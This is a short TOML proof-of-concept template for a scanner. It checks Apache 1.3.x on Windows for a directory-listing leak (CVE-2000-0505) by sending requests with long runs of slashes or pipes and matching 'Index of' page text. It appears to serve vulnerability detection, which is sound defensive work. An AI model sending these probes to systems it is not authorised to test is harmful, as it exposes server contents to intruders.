[info]
author = "ave"
description = "检测 Apache 1.3.x for Windows 目录列表漏洞，通过发送包含大量斜杠的 URL 请求验证服务器是否返回目录列表"
id = "POC-AVE-2000-0422"
name = "Apache Windows 目录列表泄漏漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0422"]
vuln_id = [
    "CVE-2000-0505",
    "AVE-2000-0422",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/|||||||"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<title>Index of",
    "Directory Listing",
    "[/]</a>",
    "Apache/1.3",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//////////////////////////////////////////////////////////"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<title>Index of",
    "Directory Listing",
    "[/]</a>",
    "Apache/1.3",
]
